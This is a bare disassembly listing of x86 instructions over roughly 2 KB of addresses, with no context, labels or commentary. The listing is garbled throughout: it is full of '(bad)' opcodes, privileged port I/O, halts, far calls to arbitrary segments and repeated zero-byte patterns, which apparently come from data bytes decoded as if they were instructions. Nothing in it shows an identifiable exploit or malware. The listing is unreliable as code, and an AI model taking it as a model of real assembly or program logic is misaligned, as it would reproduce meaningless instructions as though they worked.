  422fb4:	mov    bh,0x1b
  422fb6:	cwde   
  422fb7:	mov    bl,0xee
  422fb9:	ret    
  422fba:	fwait
  422fbb:	xor    edx,DWORD PTR [eax+0x0]
  422fbe:	add    BYTE PTR [eax],al
  422fc0:	add    BYTE PTR [eax],al
  422fc2:	push   ds
  422fc3:	test   eax,0x7ff735f6
  422fc8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fce:	mov    al,0x9c
  422fd0:	mov    bh,0xd4
  422fd2:	xchg   esi,eax
  422fd3:	aad    0x1
  422fd5:	add    BYTE PTR [ebx+0x0],ah
  422fd8:	add    BYTE PTR [eax],al
  422fda:	mov    edx,0xcc47e882
  422fdf:	inc    BYTE PTR [edi+0x500386f6]
  422fe5:	add    eax,DWORD PTR [esi+0x3418d634]
  422feb:	push   esi
  422fec:	loop   0x423052
  422fee:	shl    DWORD PTR es:[esi-0xfd58fdd],1
  422ff5:	loop   0x423048
  422ff7:	stos   BYTE PTR es:[edi],al
  422ff8:	pop    esp
  422ff9:	daa    
  422ffa:	loopne 0x42304a
  422ffc:	dec    edx
  422ffd:	jmp    0x423078
  422fff:	pop    ebp
  423000:	scas   al,BYTE PTR es:[edi]
  423001:	cmp    al,0x1b
  423003:	sub    BYTE PTR [edx],bl
  423005:	pop    ecx
  423006:	pop    esi
  423007:	inc    ecx
  423008:	fwait
  423009:	pop    eax
  42300a:	retf   0xadbe
  42300d:	sti    
  42300e:	pop    edx
  42300f:	shl    edx,cl
  423011:	push   ss
  423012:	(bad)  
  423013:	xor    al,0xce
  423015:	popa   
  423016:	mov    esi,0x70463f1a
  42301b:	fwait
  42301c:	or     al,0xb6
  42301e:	pop    ecx
  42301f:	loope  0x422fc7
  423021:	jge    0x423069
  423023:	cmp    eax,0xee905ae8
  423028:	outs   dx,BYTE PTR ds:[esi]
  423029:	xor    eax,0xa8c89785
  42302e:	jo     0x423060
  423030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423031:	div    BYTE PTR [ebx]
  423033:	bound  eax,QWORD PTR [ebx]
  423035:	push   esi
  423036:	cmp    edx,edi
  423038:	retf   0x3d85
  42303b:	pop    edi
  42303c:	aad    0x0
  42303e:	add    BYTE PTR [eax],al
  423040:	add    BYTE PTR [eax],al
  423042:	fwait
  423043:	loope  0x4230b2
  423045:	sub    eax,0xf7dbad7f
  42304a:	sar    BYTE PTR [ebx],cl
  42304c:	(bad)  
  42304d:	add    BYTE PTR [eax+0x52],ch
  423050:	jmp    0x21829db
  423055:	add    BYTE PTR [ebx+0x0],ah
  423058:	add    BYTE PTR [eax],al
  42305a:	xchg   edx,eax
  42305b:	push   edx
  42305c:	lahf   
  42305d:	into   
  42305e:	les    esp,FWORD PTR [ebx-0x2f]
  423061:	shr    BYTE PTR [esp+edx*1-0x6a],0x3a
  423066:	fldenv [eax]
  423068:	enter  0xd3de,0xe0
  42306c:	xchg   edi,eax
  42306d:	mov    edx,0xcd742206
  423072:	cmc    
  423073:	sbb    ch,dl
  423075:	shl    BYTE PTR [ebx+0x5b],cl
  423078:	push   0xc85659ab
  42307d:	in     al,0xf7
  42307f:	cmp    DWORD PTR [edi+0x11],edx
  423082:	daa    
  423083:	hlt    
  423084:	pop    es
  423085:	adc    BYTE PTR ds:[ecx+0x6703ff],ah
  42308c:	stc    
  42308d:	pusha  
  42308e:	scas   al,BYTE PTR es:[edi]
  42308f:	xlat   BYTE PTR ds:[ebx]
  423090:	xchg   ecx,eax
  423091:	fisttp QWORD PTR [esi]
  423093:	divps  xmm1,xmm6
  423096:	sbb    ah,ch
  423098:	push   0x44
  42309a:	neg    DWORD PTR [edi-0x35]
  42309d:	cmp    eax,0x147bee93
  4230a2:	dec    edi
  4230a3:	mov    BYTE PTR [esi-0x1d],ah
  4230a6:	inc    esp
  4230a7:	xchg   edi,eax
  4230a8:	leave  
  4230a9:	xor    eax,0x44bff576
  4230ae:	adc    ah,ah
  4230b0:	inc    esp
  4230b1:	dec    ebp
  4230b2:	fisttp DWORD PTR [esi+ebp*4+0x316087f7]
  4230b9:	daa    
  4230ba:	aaa    
  4230bb:	add    DWORD PTR [eax+eax*1+0x0],0x0
  4230c0:	add    BYTE PTR [eax],al
  4230c2:	or     bh,dh
  4230c4:	ja     0x423110
  4230c6:	dec    edx
  4230c8:	cmp    eax,0x2e8eedf7
  4230cd:	dec    eax
  4230ce:	sub    al,0xbd
  4230d0:	ds inc esi
  4230d2:	pop    esp
  4230d3:	(bad)  
  4230d4:	add    DWORD PTR [eax],eax
  4230d6:	arpl   WORD PTR [eax],ax
  4230d8:	add    BYTE PTR [eax],al
  4230da:	sub    ebp,DWORD PTR [ecx-0x2c684414]
  4230e0:	add    edi,DWORD PTR [eax-0x728a004f]
  4230e6:	add    ah,0x60
  4230e9:	call   0xd2b4:0x28eb06c5
  4230f0:	rcl    DWORD PTR [esi+ecx*1+0x467b9564],cl
  4230f7:	sbb    eax,0x9520a573
  4230fc:	lods   eax,DWORD PTR ds:[esi]
  4230fd:	cmp    ch,BYTE PTR [ebx+0x79]
  423100:	int    0xd0
  423102:	jb     0x4230e6
  423104:	pushf  
  423105:	in     eax,dx
  423106:	aas    
  423107:	pop    esi
  423108:	mov    al,ds:0xa2bf05dd
  42310d:	jns    0x42316b
  42310f:	(bad)  
  423110:	dec    ebp
  423111:	and    eax,0x75977719
  423116:	jns    0x423151
  423118:	ss or  bh,ch
  42311b:	push   0x40f01f1b
  423120:	loop   0x4230c7
  423122:	jp     0x42319d
  423124:	sbb    BYTE PTR es:[eax+0x6d],0x3b
  423129:	xchg   esi,eax
  42312a:	xchg   ebp,eax
  42312b:	sbb    DWORD PTR [ebx+ebx*8+0x74478f30],ebx
  423132:	std    
  423133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423134:	fmul   DWORD PTR es:[ebx+0x5a]
  423138:	imul   DWORD PTR [esi]
  42313a:	inc    ebp
  42313b:	ins    BYTE PTR es:[edi],dx
  42313c:	in     al,0x0
  42313e:	add    BYTE PTR [eax],al
  423140:	add    BYTE PTR [eax],al
  423142:	arpl   WORD PTR ss:[eax-0x10],bp
  423146:	jge    0x423143
  423148:	mov    esi,0x8c7853e7
  42314d:	daa    
  42314e:	aaa    
  42314f:	out    dx,al
  423150:	dec    edx
  423151:	nop
  423152:	mov    edi,0x630001d6
  423157:	add    BYTE PTR [eax],al
  423159:	add    cl,bh
  42315b:	and    DWORD PTR [edi+0x7c],ecx
  42315e:	adc    al,dl
  423160:	xor    bl,dl
  423162:	(bad)  
  423163:	and    al,0x63
  423165:	sbb    eax,0xc904b15
  42316a:	push   esi
  42316b:	in     eax,dx
  42316c:	adc    cl,dh
  42316e:	and    al,0x55
  423170:	pusha  
  423171:	js     0x4231a7
  423173:	adc    BYTE PTR [edi-0x1c],ah
  423176:	mov    ecx,0xa2102dcf
  42317b:	cwde   
  42317c:	push   ss
  42317d:	lods   eax,DWORD PTR ds:[esi]
  42317e:	push   es
  42317f:	out    0xbb,eax
  423181:	xchg   edi,eax
  423182:	daa    
  423183:	mov    eax,0xdd7e47f2
  423188:	or     al,0x2a
  42318a:	mov    ch,0x84
  42318c:	mov    bl,0x95
  42318e:	adc    al,0xcf
  423190:	out    dx,al
  423191:	mov    ebx,0x98eedf7d
  423196:	pop    ecx
  423197:	in     al,0x18
  423199:	int3   
  42319a:	dec    ebx
  42319b:	aaa    
  42319c:	cli    
  42319d:	out    dx,eax
  42319e:	clc    
  42319f:	inc    ebp
  4231a0:	loopne 0x423209
  4231a2:	or     DWORD PTR [eax+0x6c],ebx
  4231a5:	addr16 pushw cs
  4231a8:	rol    bl,cl
  4231aa:	icebp  
  4231ab:	add    ah,dl
  4231ad:	jmp    0x5b:0x9569bd6e
  4231b4:	pop    edi
  4231b5:	jbe    0x42314e
  4231b7:	test   ch,dh
  4231b9:	xchg   ebp,eax
  4231ba:	mov    edi,0x64d
  4231bf:	add    BYTE PTR [eax],al
  4231c1:	add    BYTE PTR [edi],ah
  4231c3:	push   ecx
  4231c4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231ce:	shl    cl,0x27
  4231d1:	rcr    BYTE PTR [eax],1
  4231d3:	fiadd  WORD PTR [ecx]
  4231d5:	add    BYTE PTR [ebx+0x0],ah
  4231d8:	add    BYTE PTR [eax],al
  4231da:	mov    ebx,0x7018e364
  4231df:	lock jns 0x42323b
  4231e2:	inc    esp
  4231e3:	mov    al,ds:0x36f8d89a
  4231e8:	inc    ebp
  4231e9:	dec    esp
  4231ea:	aaa    
  4231eb:	pop    ebx
  4231ec:	mov    DWORD PTR [ecx-0x9],edi
  4231ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231f0:	stos   DWORD PTR es:[edi],eax
  4231f1:	into   
  4231f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231f3:	scas   al,BYTE PTR es:[edi]
  4231f4:	sbb    eax,edx
  4231f6:	inc    ebp
  4231f7:	xchg   BYTE PTR [ebx],ah
  4231f9:	pop    ss
  4231fa:	jmp    0xfdfc6e7d
  4231ff:	adc    cl,BYTE PTR es:[ebx+0x73]
  423203:	hlt    
  423204:	jne    0x423244
  423206:	stos   DWORD PTR es:[edi],eax
  423207:	lods   al,BYTE PTR ds:[esi]
  423208:	add    cl,dl
  42320a:	in     eax,dx
  42320b:	psubq  mm2,QWORD PTR [edx+0x12]
  42320f:	scas   eax,DWORD PTR es:[edi]
  423210:	sbb    bh,BYTE PTR [edi+ebx*4+0x4bb341b4]
  423217:	ret    
  423218:	(bad)  
  423219:	addr16 cmp dl,bl
  42321c:	cmp    al,0xef
  42321e:	xor    eax,0x42bc9f08
  423223:	mov    cl,0x1c
  423225:	and    edi,ebp
  423227:	push   es
  423228:	repz xchg esi,eax
  42322a:	dec    esi
  42322b:	in     eax,dx
  42322c:	arpl   WORD PTR [edi+0x3],cx
  42322f:	or     DWORD PTR [ebp-0x36],edi
  423232:	pop    ebp
  423233:	jo     0x4231e5
  423235:	add    al,BYTE PTR [ebx+0x23]
  423238:	mov    ebp,0x481a014a
  42323d:	add    BYTE PTR [eax],al
  42323f:	add    BYTE PTR [eax],al
  423241:	add    BYTE PTR [edi],ah
  423243:	ss lahf 
  423245:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42324b:	and    eax,0x4998075b
  423250:	inc    ecx
  423251:	mov    ah,0x7b
  423253:	fiadd  WORD PTR [ecx]
  423255:	add    BYTE PTR [ebx+0x0],ah
  423258:	add    BYTE PTR [eax],al
  42325a:	sub    esp,DWORD PTR ds:0xc9c7a100
  423260:	popf   
  423261:	pop    ds
  423262:	fild   QWORD PTR [edi-0x16]
  423265:	rcl    ah,1
  423267:	stc    
  423268:	retf   0x3018
  42326b:	call   0xa9d7:0xfb8c1d96
  423272:	or     BYTE PTR ds:0xe201a501,0xb7
  423279:	setno  BYTE PTR [edx]
  42327c:	sar    ah,0x27
  42327f:	adc    DWORD PTR [eax+0x5a],ecx
  423282:	je     0x42328a
  423284:	mov    bh,0x27
  423286:	push   0xffffffd4
  423288:	jle    0x42324c
  42328a:	jmp    0x423245
  42328c:	inc    ecx
  42328d:	leave  
  42328e:	bound  ecx,QWORD PTR [ecx+ebp*4-0x36307478]
  423295:	lea    edx,[edx]
  423297:	fs das 
  423299:	ins    BYTE PTR es:[edi],dx
  42329a:	add    ebx,DWORD PTR [ebx+0x53bc318]
  4232a0:	cmc    
  4232a1:	enter  0x7a41,0xa1
  4232a5:	add    al,0xc7
  4232a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232a8:	dec    eax
  4232a9:	enter  0xd1ff,0x23
  4232ad:	cmp    ebx,DWORD PTR [ecx-0x2ea6ca14]
  4232b3:	ins    BYTE PTR es:[edi],dx
  4232b4:	jbe    0x4232cd
  4232b6:	popf   
  4232b7:	add    eax,0xb1ceec6b
  4232bc:	into   
  4232bd:	add    BYTE PTR [eax],al
  4232bf:	add    BYTE PTR [eax],al
  4232c1:	add    BYTE PTR [edi],dh
  4232c3:	(bad)  
  4232c4:	out    0xc2,eax
  4232c6:	mul    ebx
  4232c8:	aaa    
  4232c9:	cmc    
  4232ca:	xchg   ecx,eax
  4232cb:	call   0xa1cf:0xcadaeef4
  4232d2:	(bad)  
  4232d4:	add    DWORD PTR [eax],eax
  4232d6:	arpl   WORD PTR [eax],ax
  4232d8:	add    BYTE PTR [eax],al
  4232da:	jmp    DWORD PTR [eax]
  4232dc:	fucom  st(3)
  4232de:	jno    0x4232b6
  4232e0:	dec    ecx
  4232e1:	stos   BYTE PTR es:[edi],al
  4232e2:	pop    edx
  4232e3:	imul   esi,DWORD PTR [ebx+ebp*4],0xffffffaa
  4232e7:	and    ebp,DWORD PTR [ecx+ebx*1]
  4232ea:	and    al,dl
  4232ec:	xor    ch,ch
  4232ee:	mov    bl,0xed
  4232f0:	je     0x4232bf
  4232f2:	xchg   edx,eax
  4232f3:	and    al,BYTE PTR [edx]
  4232f5:	push   esi
  4232f6:	stc    
  4232f7:	and    esp,DWORD PTR [edx+0x59768950]
  4232fd:	cmp    ch,ch
  4232ff:	das    
  423300:	add    BYTE PTR [eax+0x5e2794c7],cl
  423306:	pop    ebx
  423307:	jp     0x423303
  423309:	mov    WORD PTR [eax-0x70972617],?
  42330f:	push   cs
  423310:	icebp  
  423311:	pop    ss
  423312:	xchg   esp,eax
  423313:	and    ch,BYTE PTR [eax+0x52]
  423316:	pop    ebp
  423317:	test   eax,ecx
  423319:	(bad)  
  42331a:	fst    DWORD PTR [edx-0x3b]
  42331d:	dec    edx
  42331e:	inc    DWORD PTR [edx+0x3cf8f99]
  423324:	sbb    ah,cl
  423326:	adc    DWORD PTR [ecx+ecx*4+0x7088f0e1],0xffffffc5
  42332e:	sti    
  42332f:	adc    eax,0x65ca04af
  423334:	pop    ss
  423335:	in     eax,0x2f
  423337:	inc    ebp
  423338:	mov    esp,0x31d10c2a
  42333d:	add    BYTE PTR [eax],al
  42333f:	add    BYTE PTR [eax],al
  423341:	add    BYTE PTR [esi],dl
  423343:	aad    0xdf
  423345:	out    dx,eax
  423346:	fucomip st,st(7)
  423348:	ss std 
  42334a:	cmp    BYTE PTR [esi+0x137e5f3a],al
  423350:	aam    0xd9
  423352:	inc    ecx
  423353:	fild   WORD PTR [ecx]
  423355:	add    BYTE PTR [ebx+0x0],ah
  423358:	add    BYTE PTR [eax],al
  42335a:	sbb    esi,eax
  42335c:	cmp    edx,DWORD PTR [ebx+0x5e]
  42335f:	inc    ebx
  423360:	and    BYTE PTR [esi],dl
  423362:	add    DWORD PTR [ebx-0x5abb780],edx
  423368:	mov    esi,DWORD PTR [ecx+ebp*8-0x41]
  42336c:	js     0x42334b
  42336e:	or     BYTE PTR [ecx],ah
  423370:	xor    ebp,DWORD PTR [edi-0x59]
  423373:	xchg   ebp,eax
  423374:	and    bl,dl
  423376:	stos   BYTE PTR es:[edi],al
  423377:	ret    
  423378:	mov    edi,0x6a91cc1c
  42337d:	imul   bl
  42337f:	adc    dh,BYTE PTR [edx-0x7b]
  423382:	addr16 mov ds:0xe89f,eax
  423386:	icebp  
  423387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423388:	fcmovnu st,st(4)
  42338a:	add    esi,0x7471df17
  423390:	pop    edx
  423391:	dec    ebp
  423392:	fwait
  423393:	pop    ecx
  423395:	call   0xbf014fb8
  42339a:	mov    edi,0xaf86f21d
  42339f:	lods   eax,DWORD PTR ds:[esi]
  4233a0:	hlt    
  4233a1:	scas   al,BYTE PTR es:[edi]
  4233a2:	(bad)
  4233a5:	fstp   QWORD PTR [ecx]
  4233a7:	lods   eax,DWORD PTR ds:[esi]
  4233a8:	and    edi,DWORD PTR [edx-0xe54d637]
  4233ae:	ds cs out 0xa5,al
  4233b2:	push   esi
  4233b3:	ss sub eax,0x1f4b41aa
  4233b9:	add    BYTE PTR ds:[ebx+0x59],dl
  4233bd:	add    BYTE PTR [eax],al
  4233bf:	add    BYTE PTR [eax],al
  4233c1:	add    BYTE PTR [esi+0x76],ch
  4233c4:	in     al,0xca
  4233c6:	cld    
  4233c7:	fisubr DWORD PTR [esi-0xa]
  4233ca:	sbb    BYTE PTR [edx+0x36ce9787],dl
  4233d0:	and    BYTE PTR [esp+eiz*4],ch
  4233d3:	fild   WORD PTR [ecx]
  4233d5:	add    BYTE PTR [ebx+0x0],ah
  4233d8:	add    BYTE PTR [eax],al
  4233da:	mov    eax,0xb7085752
  4233df:	mov    edi,0x15779be3
  4233e4:	or     edx,esi
  4233e6:	das    
  4233e7:	push   esi
  4233e8:	push   eax
  4233e9:	mov    cl,0x3b
  4233eb:	mov    edx,DWORD PTR [esp+edx*4]
  4233ee:	dec    edi
  4233ef:	xlat   BYTE PTR ds:[ebx]
  4233f0:	mov    esi,DWORD PTR [eax-0x79]
  4233f3:	data16 repnz mov ds:0x87264c0d,al
  4233fa:	cmp    edx,eax
  4233fc:	pop    es
  4233fd:	jle    0x4233f6
  4233ff:	add    al,0xe5
  423401:	dec    esp
  423402:	(bad)  
  423403:	sub    eax,0xf34e7d0
  423408:	gs test al,0x41
  42340b:	loope  0x4233d3
  42340d:	push   ecx
  42340e:	xchg   BYTE PTR [eax+0x667adffc],bh
  423414:	retf   
  423415:	jl     0x423405
  423417:	cwde   
  423418:	mov    ebp,0x5217e5bc
  42341d:	aas    
  42341e:	dec    esi
  42341f:	jno    0x4233bb
  423421:	sub    DWORD PTR [ebp-0x272115bc],ecx
  423427:	hlt    
  423428:	test   eax,0x7b7a1a30
  42342d:	pop    edx
  42342e:	xor    cl,BYTE PTR [ebx]
  423430:	adc    eax,0xf635518a
  423435:	sbb    eax,0x3fcd38ff
  42343a:	xor    ch,ah
  42343c:	add    BYTE PTR cs:[eax],al
  42343f:	add    BYTE PTR [eax],al
  423441:	add    BYTE PTR [edx],bh
  423443:	push   edx
  423444:	les    ecx,FWORD PTR [edi]
  423446:	in     al,dx
  423447:	lahf   
  423448:	sti    
  423449:	ja     0x423441
  42344b:	rcl    DWORD PTR [eax-0x2817b82d],1
  423451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423452:	pop    es
  423453:	loopne 0x423456
  423455:	add    BYTE PTR [ebx+0x0],ah
  423458:	add    BYTE PTR [eax],al
  42345a:	scas   eax,DWORD PTR es:[edi]
  42345b:	test   al,0xe6
  42345d:	xchg   ebp,eax
  42345e:	mov    bl,0x90
  423460:	cmc    
  423461:	jb     0x4233ed
  423463:	push   es
  423464:	dec    edi
  423465:	xchg   BYTE PTR [esi+0x74b2b60],cl
  42346b:	arpl   WORD PTR [edi-0x4665ee34],dx
  423471:	pop    esi
  423472:	add    eax,0xb39f34a1
  423477:	cmp    esp,DWORD PTR [ebx-0x1b90a349]
  42347d:	push   cs
  42347e:	sbb    DWORD PTR [edi+eiz*2],ebx
  423481:	popa   
  423482:	mov    dl,0x39
  423484:	sbb    eax,0x64c92175
  423489:	jmp    0x49e7e0b2
  42348e:	mov    ah,0x38
  423490:	mov    dh,0x12
  423492:	dec    esp
  423493:	std    
  423494:	jg     0x423481
  423496:	pop    ebp
  423498:	repnz mov dl,0x37
  42349b:	fidivr WORD PTR [ecx-0x2d98e7f2]
  4234a1:	dec    eax
  4234a2:	jmp    FWORD PTR [edi]
  4234a4:	rcr    DWORD PTR [ecx+0x46acfad],0xf2
  4234ab:	xor    DWORD PTR [ebx-0x73b6daa],edx
  4234b1:	ins    BYTE PTR es:[edi],dx
  4234b2:	or     ecx,DWORD PTR [edi+0x64]
  4234b5:	add    al,0x54
  4234b7:	cmc    
  4234b8:	jecxz  0x423459
  4234ba:	and    al,0x32
  4234bc:	sbb    BYTE PTR [eax],al
  4234be:	add    BYTE PTR [eax],al
  4234c0:	add    BYTE PTR [eax],al
  4234c2:	xchg   ebx,eax
  4234c3:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  4234ca:	push   eax
  4234cb:	loopne 0x4234c7
  4234cd:	call   0xe06a:0xec772806
  4234d4:	add    DWORD PTR [eax],eax
  4234d6:	arpl   WORD PTR [eax],ax
  4234d8:	add    BYTE PTR [eax],al
  4234da:	inc    ebx
  4234db:	in     al,0x0
  4234dd:	ins    DWORD PTR es:[edi],dx
  4234de:	jp     0x423543
  4234e0:	xlat   BYTE PTR ds:[ebx]
  4234e1:	adc    BYTE PTR [eax],bl
  4234e3:	mov    al,BYTE PTR [edi+0x7d]
  4234e6:	aas    
  4234e7:	add    bh,BYTE PTR [ebx]
  4234e9:	int    0xd8
  4234eb:	stos   DWORD PTR es:[edi],eax
  4234ec:	xchg   ebp,eax
  4234ed:	sahf   
  4234ee:	adc    eax,0x2996a026
  4234f3:	mov    ds:0xd24f3230,eax
  4234f8:	push   cs
  4234f9:	sbb    ebx,esp
  4234fb:	push   ds
  4234fc:	jne    0x423536
  4234fe:	retf   
  4234ff:	int    0xb9
  423501:	lods   eax,DWORD PTR ds:[esi]
  423502:	or     BYTE PTR [eax-0x15],0x2
  423506:	sub    eax,0xb536c79e
  42350b:	dec    ebx
  42350c:	loop   0x4234a1
  42350e:	test   BYTE PTR [edi+eiz*2+0x71],bl
  423512:	punpckldq mm1,DWORD PTR [edi]
  423515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423516:	leave  
  423517:	mov    WORD PTR [ecx-0x3ab7ea6e],?
  42351d:	jae    0x4234d8
  42351f:	mov    eax,0x437d2ae5
  423524:	test   BYTE PTR [edi],bl
  423526:	dec    BYTE PTR [ebx+0xa45e7d1]
  42352c:	mov    ebx,0x8510571b
  423531:	pop    ss
  423532:	xor    dh,0x6
  423535:	xor    esi,ebp
  423537:	stos   BYTE PTR es:[edi],al
  423538:	or     DWORD PTR [ebx-0x7a],ebp
  42353b:	cld    
  42353c:	mov    ecx,0x0
  423541:	add    ah,bl
  423543:	fincstp 
  423545:	shl    bh,0xee
  423548:	(bad)  
  423549:	frstor [ecx+eax*1]
  42354c:	pop    ebp
  42354d:	dec    edi
  42354e:	outs   dx,BYTE PTR ds:[esi]
  42354f:	shl    BYTE PTR [ecx+0x1e0cd27],0x0
  423556:	arpl   WORD PTR [eax],ax
  423558:	add    BYTE PTR [eax],al
  42355a:	or     BYTE PTR [edi],dh
  42355c:	mov    dl,ch
  42355e:	icebp  
  42355f:	lock jb 0x4234ff
  423562:	sub    al,0x67
  423564:	in     eax,dx
  423565:	lods   al,BYTE PTR ds:[esi]
  423566:	lock aas 
  423568:	or     ebx,DWORD PTR [ecx+0x7daedbbe]
  42356e:	pop    edi
  42356f:	or     al,0xb1
  423571:	cld    
  423572:	ja     0x42353c
  423574:	aam    0xca
  423576:	adc    BYTE PTR [eax-0x6051a0d1],cl
  42357c:	mov    edi,0x5cabf81e
  423581:	xor    esi,edx
  423583:	das    
  423584:	rcl    DWORD PTR [edx-0x5c],cl
  423587:	outs   dx,BYTE PTR ds:[esi]
  423588:	das    
  423589:	lahf   
  42358a:	outs   dx,DWORD PTR ds:[esi]
  42358b:	dec    ebx
  42358c:	jmp    0x423536
  42358e:	lahf   
  42358f:	mov    dl,0xd7
  423591:	jnp    0x4235b0
  423593:	jae    0x42357f
  423595:	popf   
  423596:	cwde   
  423597:	cmp    cl,BYTE PTR [ecx]
  423599:	add    DWORD PTR [ecx-0x6cd3fa7c],0x6086347e
  4235a3:	or     DWORD PTR [edi+0x1f4979ea],0xce80e2de
  4235ad:	xor    BYTE PTR [eax+0x27400a60],cl
  4235b3:	sbb    dh,al
  4235b5:	push   eax
  4235b6:	in     eax,0x8a
  4235b8:	outs   dx,BYTE PTR ds:[esi]
  4235b9:	xor    eax,0xcb6bcc
  4235be:	add    BYTE PTR [eax],al
  4235c0:	add    BYTE PTR [eax],al
  4235c2:	outs   dx,DWORD PTR ds:[esi]
  4235c3:	mov    ds:0x7edd2ad4,al
  4235c8:	jmp    edi
  4235ca:	push   edx
  4235cb:	fcmovu st,st(5)
  4235cd:	in     eax,0x50
  4235cf:	mov    esp,0xe130b13e
  4235d4:	add    DWORD PTR [eax],eax
  4235d6:	arpl   WORD PTR [eax],ax
  4235d8:	add    BYTE PTR [eax],al
  4235da:	call   0xe7c6:0xb3f06bdc
  4235e1:	out    0xc8,al
  4235e3:	loopne 0x4235bf
  4235e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235e6:	or     eax,0x3ad2ddf0
  4235eb:	div    BYTE PTR [edi]
  4235ed:	imul   ecx,DWORD PTR [ecx-0x139cda01],0x34
  4235f4:	xchg   ebp,eax
  4235f5:	hlt    
  4235f6:	fistp  DWORD PTR [esi-0x508b64d7]
  4235fc:	imul   ecx,DWORD PTR [esi-0x70e1671b],0x1fe0f09d
  423606:	pop    ecx
  423607:	jp     0x42360d
  423609:	data16 je 0x423640
  42360c:	sbb    cl,dl
  42360e:	cmp    DWORD PTR cs:[ebx-0x6],edx
  423612:	scas   eax,DWORD PTR es:[edi]
  423613:	(bad)  
  423614:	add    ah,BYTE PTR [eax-0x78e3eb52]
  42361a:	xlat   BYTE PTR ds:[ebx]
  42361b:	add    edi,DWORD PTR [eax+0x3a2fa044]
  423621:	in     al,dx
  423622:	inc    ebx
  423623:	test   eax,0x21ab4296
  423628:	loope  0x42366b
  42362a:	xchg   ecx,eax
  42362b:	cwde   
  42362c:	jp     0x4236aa
  42362e:	xchg   edx,eax
  42362f:	push   cs
  423630:	push   esp
  423631:	xchg   edi,eax
  423632:	fdivr  DWORD PTR [esi]
  423634:	jnp    0x4236ac
  423636:	gs xchg ebp,eax
  423638:	xchg   BYTE PTR [edi+0xfcd57e],dl
  42363e:	add    BYTE PTR [eax],al
  423640:	add    BYTE PTR [eax],al
  423642:	stc    
  423643:	sbb    al,al
  423645:	inc    esi
  423646:	jecxz  0x423626
  423648:	(bad)  
  423649:	mov    edi,0xe1f1bc83
  42364e:	mov    al,ds:0x93dd9258
  423653:	loope  0x423656
  423655:	add    BYTE PTR [ebx+0x0],ah
  423658:	add    BYTE PTR [eax],al
  42365a:	mov    esi,0x28eeef7
  42365f:	jo     0x42368e
  423661:	mov    DWORD PTR [edx],ebx
  423663:	(bad)  [eax]
  423665:	aas    
  423666:	outs   dx,BYTE PTR ds:[esi]
  423667:	test   DWORD PTR [esp+esi*2-0x6aaa207c],eax
  42366e:	ror    ah,cl
  423670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423671:	pop    ebx
  423672:	or     BYTE PTR [edi],dl
  423674:	push   esi
  423675:	mov    esi,0x2c37e944
  42367a:	xor    eax,0x4f6aa0f9
  42367f:	fisub  WORD PTR [esi]
  423681:	cmp    edi,edi
  423683:	addr16 iret 
  423685:	mov    bl,0x88
  423687:	sbb    BYTE PTR [ecx+eiz*8-0x32148f16],bl
  42368e:	mov    ch,0x6b
  423690:	xlat   BYTE PTR ds:[ebx]
  423691:	outs   dx,DWORD PTR ds:[esi]
  423692:	and    edx,DWORD PTR [ebx+0x68d72931]
  423698:	enter  0xc4f9,0xb
  42369c:	mov    bh,0xc3
  42369e:	cmp    ah,BYTE PTR [edx+eax*1-0x12]
  4236a2:	pop    ds
  4236a3:	sti    
  4236a4:	adc    al,al
  4236a6:	mov    esi,0xd4ae6d91
  4236ab:	mov    dh,ch
  4236ad:	pop    esp
  4236ae:	and    BYTE PTR [ebp+0x1c],ch
  4236b1:	sbb    esi,DWORD PTR [eax]
  4236b3:	jecxz  0x423704
  4236b5:	stos   DWORD PTR es:[edi],eax
  4236b6:	sbb    ah,BYTE PTR [esi+0x5aa2830c]
  4236bc:	add    BYTE PTR cs:[eax],al
  4236bf:	add    BYTE PTR [eax],al
  4236c1:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4236c7:	(bad)  
  4236c8:	mov    ch,0xbb
  4236ca:	icebp  
  4236cb:	and    eax,0x87ca8c27
  4236d0:	push   edi
  4236d1:	adc    esi,esi
  4236d3:	loope  0x4236d6
  4236d5:	add    BYTE PTR [ebx+0x0],ah
  4236d8:	add    BYTE PTR [eax],al
  4236da:	inc    eax
  4236db:	xor    cl,BYTE PTR [edi]
  4236dd:	mov    al,ds:0xdb86cc63
  4236e2:	cmp    DWORD PTR [edi-0x484ed5e3],0xffffffde
  4236e9:	inc    edx
  4236ea:	sbb    BYTE PTR [esi+0x78],al
  4236ed:	adc    al,0x6d
  4236ef:	jns    0x42373a
  4236f1:	repnz lds ebx,FWORD PTR cs:[ebx+edi*1-0x7f]
  4236f7:	mov    dl,0x24
  4236f9:	cmp    al,0x47
  4236fb:	mov    ecx,cs
  4236fd:	out    0x3f,al
  4236ff:	jno    0x423718
  423701:	push   ebp
  423702:	dec    eax
  423704:	scas   eax,DWORD PTR es:[edi]
  423705:	pop    ss
  423706:	popa   
  423707:	daa    
  423708:	test   eax,0x58db4c2f
  42370d:	mov    bl,0x5d
  42370f:	lods   al,BYTE PTR ds:[esi]
  423710:	adc    al,0x7
  423712:	test   BYTE PTR [ecx],ch
  423714:	sub    eax,0xde5a504
  423719:	out    dx,eax
  42371a:	cmp    BYTE PTR [ebp-0x2f0f0b1e],0x58
  423721:	add    BYTE PTR [ecx],dh
  423723:	andnps xmm3,XMMWORD PTR [esi+0x17e42a68]
  42372a:	dec    edi
  42372b:	hlt    
  42372c:	push   cs
  42372d:	lds    ebp,FWORD PTR [esi]
  42372f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423730:	jns    0x4236b9
  423732:	int    0xeb
  423734:	(bad)  
  423735:	shl    DWORD PTR [edi],1
  423737:	stos   BYTE PTR es:[edi],al
  423738:	push   ebp
  423739:	fsubr  st,st(0)
  42373b:	or     al,cl
  42373d:	add    BYTE PTR [eax],al
  42373f:	add    BYTE PTR [eax],al
  423741:	add    BYTE PTR [edx],dl
